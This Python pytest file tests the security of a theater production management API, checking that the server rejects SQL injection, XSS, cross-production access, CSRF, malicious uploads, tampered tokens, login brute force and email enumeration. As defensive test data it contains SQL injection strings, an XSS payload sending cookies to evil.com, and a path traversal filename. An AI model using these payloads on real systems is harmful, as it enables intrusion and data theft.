"""
Security tests (SPEC-008 TDD Strategy).

Covers:
- SEC-01: SQL injection (parameterized queries)
- SEC-02: XSS in markdown (stripped)
- SEC-03: IDOR (403 on cross-production access)
- SEC-04: CSRF on POST without valid origin (403)
- SEC-05: SVG upload with JavaScript (rejected)
- SEC-06: Upload >5MB (413)
- SEC-07: Expired session (401)
- SEC-08: Tampered cookie/token (401)
- SEC-09: Rate limiting (5/IP login, 10 account lockout)
- SEC-10: Email enumeration (identical responses)
"""

import pytest


class TestSQLInjection:
    """SEC-01: SQL injection prevention."""

    async def test_sql_injection_in_login_email(self, client):
        """SQL injection in email field is parameterized away."""
        response = await client.post("/api/auth/login", json={
            "email": "' OR 1=1; --",
            "password": "anything",
        })
        # Should just return "Invalid email or password", not a DB error
        assert response.status_code == 401
        assert response.json()["error"] == "UNAUTHORIZED"

    async def test_sql_injection_in_theater_name(self, client, auth_headers):
        """SQL injection in theater name is safely parameterized."""
        headers = auth_headers("sql-inject-user-1")
        response = await client.post("/api/theaters", json={
            "name": "'; DROP TABLE theaters; --",
            "city": "Springfield",
            "state": "IL",
        }, headers=headers)
        # Should either create safely or fail validation, not drop table
        assert response.status_code in [201, 400]

    async def test_sql_injection_in_search_params(self, client, auth_headers):
        """SQL injection in query parameters is parameterized."""
        headers = auth_headers("director-id")
        response = await client.get(
            "/api/productions/nonexistent-prod/bulletin",
            headers=headers,
        )
        assert response.status_code in [400, 403, 404]

    async def test_sql_injection_in_conflict_reason(self, client, auth_headers):
        """SQL injection in conflict reason is safely stored."""
        headers = auth_headers("cast-id")
        response = await client.post("/api/productions/prod-id/conflicts", json={
            "dates": [{"rehearsal_date_id": "date-1", "reason": "'; DELETE FROM cast_conflicts; --"}],
        }, headers=headers)
        # Should be stored as literal text, not executed
        assert response.status_code in [201, 400]

    async def test_sql_injection_in_chat_body(self, client, auth_headers):
        """SQL injection in chat message body is safely stored."""
        headers = auth_headers("director-id")
        response = await client.post("/api/productions/prod-id/messages", json={
            "recipient_id": "cast-member-id",
            "body": "'; UPDATE users SET password_hash='hacked'; --",
        }, headers=headers)
        assert response.status_code in [201, 400]


class TestXSSPrevention:
    """SEC-02: XSS prevention in Markdown."""

    async def test_script_tag_in_bulletin(self, client, auth_headers):
        """Script tags stripped from bulletin posts."""
        headers = auth_headers("director-id")
        response = await client.post("/api/productions/prod-id/bulletin", json={
            "title": "XSS Test",
            "body": '<script>document.location="https://evil.com/steal?c="+document.cookie</script>',
        }, headers=headers)
        assert response.status_code == 201
        assert "<script>" not in response.json()["body"]

    async def test_onerror_attribute_stripped(self, client, auth_headers):
        """Event handler attributes stripped."""
        headers = auth_headers("director-id")
        response = await client.post("/api/productions/prod-id/bulletin", json={
            "title": "Event XSS",
            "body": '<img src=x onerror="alert(1)">',
        }, headers=headers)
        assert response.status_code == 201
        assert "onerror" not in response.json()["body"]

    async def test_javascript_uri_in_link(self, client, auth_headers):
        """javascript: URIs in links are stripped."""
        headers = auth_headers("director-id")
        response = await client.post("/api/productions/prod-id/bulletin", json={
            "title": "JS URI",
            "body": '[click me](javascript:alert(1))',
        }, headers=headers)
        assert response.status_code == 201
        assert "javascript:" not in response.json()["body"]

    async def test_data_uri_blocked(self, client, auth_headers):
        """data: URIs in Markdown are blocked."""
        headers = auth_headers("director-id")
        response = await client.post("/api/productions/prod-id/bulletin", json={
            "title": "Data URI",
            "body": '<a href="data:text/html,<script>alert(1)</script>">click</a>',
        }, headers=headers)
        assert response.status_code == 201
        assert "data:" not in response.json()["body"]


class TestIDOR:
    """SEC-03: Insecure Direct Object Reference prevention."""

    async def test_access_other_production_bulletin(self, client, auth_headers):
        """Member of Prod A cannot view Prod B bulletin."""
        headers = auth_headers("prod-a-member")
        response = await client.get("/api/productions/prod-b-id/bulletin", headers=headers)
        assert response.status_code == 403

    async def test_modify_other_production_schedule(self, client, auth_headers):
        """Director of Prod A cannot modify Prod B dates."""
        headers = auth_headers("director-a")
        response = await client.patch(
            "/api/productions/prod-b-id/schedule/date-id",
            json={"note": "IDOR attack"},
            headers=headers,
        )
        assert response.status_code == 403

    async def test_access_other_production_conflicts(self, client, auth_headers):
        """Cannot access conflict data from another production."""
        headers = auth_headers("prod-a-member")
        response = await client.get("/api/productions/prod-b-id/conflicts", headers=headers)
        assert response.status_code == 403

    async def test_access_other_production_chat(self, client, auth_headers):
        """Cannot access chat from another production."""
        headers = auth_headers("prod-a-member")
        response = await client.get("/api/productions/prod-b-id/conversations", headers=headers)
        assert response.status_code == 403

    async def test_modify_date_from_wrong_production(self, client, auth_headers):
        """Date ID from Prod B used in Prod A request returns 404."""
        headers = auth_headers("director-a")
        response = await client.patch(
            "/api/productions/prod-a-id/schedule/date-from-prod-b",
            json={"note": "Cross-production IDOR"},
            headers=headers,
        )
        # 403 (not a member) or 404 (date not found) — both prevent IDOR
        assert response.status_code in [403, 404]

    async def test_uuid_guessing_blocked(self, client, auth_headers):
        """Random UUID for production returns 404, not data leak."""
        headers = auth_headers("any-user")
        import uuid
        fake_id = str(uuid.uuid4())
        response = await client.get(f"/api/productions/{fake_id}/bulletin", headers=headers)
        assert response.status_code in [403, 404]


class TestCSRF:
    """SEC-04: CSRF protection."""

    async def test_register_wrong_origin(self, client):
        """Registration from foreign origin rejected."""
        response = await client.post("/api/auth/register", json={
            "email": "csrf@test.com",
            "name": "CSRF",
            "password": "StrongP@ss99!",
            "date_of_birth": "1990-01-01",
        }, headers={"Origin": "https://evil-site.com"})
        assert response.status_code in [400, 403]

    async def test_forgot_password_wrong_origin(self, client):
        """Forgot password from foreign origin rejected."""
        response = await client.post("/api/auth/forgot-password", json={
            "email": "user@example.com",
        }, headers={"Origin": "https://attacker.com"})
        assert response.status_code in [400, 403]

    async def test_reset_password_wrong_origin(self, client):
        """Reset password from foreign origin rejected."""
        response = await client.post("/api/auth/reset-password", json={
            "token": "any-token",
            "new_password": "NewP@ss!",
        }, headers={"Origin": "https://phishing-site.com"})
        assert response.status_code in [400, 403]


class TestMaliciousUpload:
    """SEC-05, SEC-06: Malicious file upload prevention."""

    async def test_svg_with_javascript(self, client, auth_headers):
        """SVG with embedded JavaScript is rejected."""
        import io
        headers = auth_headers("cast-id")
        svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        files = {"file": ("evil.svg", io.BytesIO(svg), "image/svg+xml")}
        response = await client.post(
            "/api/productions/prod-id/profile/headshot",
            files=files,
            headers=headers,
        )
        assert response.status_code == 400

    async def test_polyglot_file_rejected(self, client, auth_headers):
        """File with misleading extension but wrong magic bytes rejected."""
        import io
        headers = auth_headers("cast-id")
        # GIF magic bytes but .jpg extension
        gif_as_jpg = b"GIF89a" + b"\x00" * 1000
        files = {"file": ("trick.jpg", io.BytesIO(gif_as_jpg), "image/jpeg")}
        response = await client.post(
            "/api/productions/prod-id/profile/headshot",
            files=files,
            headers=headers,
        )
        assert response.status_code == 400

    async def test_oversized_upload(self, client, auth_headers):
        """File > 5MB returns 413."""
        import io
        headers = auth_headers("cast-id")
        large = b"\xff\xd8\xff\xe0" + b"\x00" * (5 * 1024 * 1024 + 1)
        files = {"file": ("big.jpg", io.BytesIO(large), "image/jpeg")}
        response = await client.post(
            "/api/productions/prod-id/profile/headshot",
            files=files,
            headers=headers,
        )
        assert response.status_code == 413

    async def test_path_traversal_filename(self, client, auth_headers):
        """Path traversal in filename is neutralized (UUID generated server-side)."""
        import io
        headers = auth_headers("cast-id")
        jpeg = b"\xff\xd8\xff\xe0" + b"\x00" * 1000
        files = {"file": ("../../../etc/passwd", io.BytesIO(jpeg), "image/jpeg")}
        response = await client.post(
            "/api/productions/prod-id/profile/headshot",
            files=files,
            headers=headers,
        )
        if response.status_code == 200:
            assert ".." not in response.json()["headshot_url"]
            assert "etc" not in response.json()["headshot_url"]
            assert "passwd" not in response.json()["headshot_url"]


class TestExpiredSession:
    """SEC-07: Expired session handling."""

    async def test_expired_jwt_returns_401(self, client):
        """Expired JWT token returns 401."""
        response = await client.get("/api/productions", headers={
            "Authorization": "Bearer expired-jwt-token",
        })
        assert response.status_code == 401


class TestTamperedToken:
    """SEC-08: Tampered cookie/token handling."""

    async def test_tampered_jwt_returns_401(self, client):
        """Modified JWT signature returns 401."""
        response = await client.get("/api/productions", headers={
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.TAMPERED",
        })
        assert response.status_code == 401

    async def test_jwt_with_wrong_secret(self, client):
        """JWT signed with wrong secret returns 401."""
        response = await client.get("/api/productions", headers={
            "Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.wrongsignature",
        })
        assert response.status_code == 401


class TestRateLimiting:
    """SEC-09: Rate limiting enforcement."""

    async def test_login_rate_limit_5_per_ip(self, client):
        """5 login attempts per minute per IP, 6th returns 429."""
        for i in range(5):
            await client.post("/api/auth/login", json={
                "email": f"rate{i}@example.com",
                "password": "test",
            })
        response = await client.post("/api/auth/login", json={
            "email": "rate5@example.com",
            "password": "test",
        })
        assert response.status_code == 429

    async def test_account_lockout_10_attempts(self, client):
        """10 failed attempts in 15 minutes locks account for 30 minutes."""
        # Register user first, then fail 10 times
        await client.post("/api/auth/register", json={
            "email": "locktest@example.com",
            "name": "Lock",
            "password": "StrongP@ss99!",
            "date_of_birth": "1990-01-01",
        })
        # Send failed login attempts — some will be rate-limited (429) after 5/min
        for _ in range(10):
            resp = await client.post("/api/auth/login", json={
                "email": "locktest@example.com",
                "password": "wrong",
            })
            # Either 401 (wrong password) or 429 (rate limited) is acceptable
            assert resp.status_code in [401, 429]
        response = await client.post("/api/auth/login", json={
            "email": "locktest@example.com",
            "password": "StrongP@ss99!",  # Correct password
        })
        # Either locked (401) or rate limited (429)
        assert response.status_code in [401, 429]

    async def test_chat_rate_limit_30_per_min(self, client, auth_headers):
        """Chat rate limit: 30 messages per minute per user."""
        headers = auth_headers("director-id")
        for i in range(30):
            await client.post("/api/productions/prod-id/messages", json={
                "recipient_id": "cast-member-id",
                "body": f"msg {i}",
            }, headers=headers)
        response = await client.post("/api/productions/prod-id/messages", json={
            "recipient_id": "cast-member-id",
            "body": "one too many",
        }, headers=headers)
        assert response.status_code == 429


class TestEmailEnumeration:
    """SEC-10: Email enumeration prevention."""

    async def test_login_same_error_for_missing_and_wrong(self, client):
        """Login returns identical errors for wrong password vs non-existent email."""
        resp_wrong = await client.post("/api/auth/login", json={
            "email": "exists@example.com",
            "password": "WrongPassword!",
        })
        resp_missing = await client.post("/api/auth/login", json={
            "email": "doesnotexist@example.com",
            "password": "AnyPassword!",
        })
        # Both should be 401 with same message
        assert resp_wrong.status_code == 401
        assert resp_missing.status_code == 401
        assert resp_wrong.json()["message"] == resp_missing.json()["message"]

    async def test_register_same_response_for_duplicate(self, client):
        """Registration returns identical response for new vs existing email."""
        await client.post("/api/auth/register", json={
            "email": "dup@example.com",
            "name": "First",
            "password": "StrongP@ss99!",
            "date_of_birth": "1990-01-01",
        })
        response = await client.post("/api/auth/register", json={
            "email": "dup@example.com",
            "name": "Second",
            "password": "StrongP@ss99!",
            "date_of_birth": "1990-01-01",
        })
        assert response.status_code in [200, 201]
        # Must not say "email already exists"

    async def test_forgot_password_same_for_all(self, client):
        """Forgot password returns same response for existing and non-existing."""
        resp_exists = await client.post("/api/auth/forgot-password", json={
            "email": "exists@example.com",
        })
        resp_missing = await client.post("/api/auth/forgot-password", json={
            "email": "nonexistent@example.com",
        })
        assert resp_exists.status_code == resp_missing.status_code
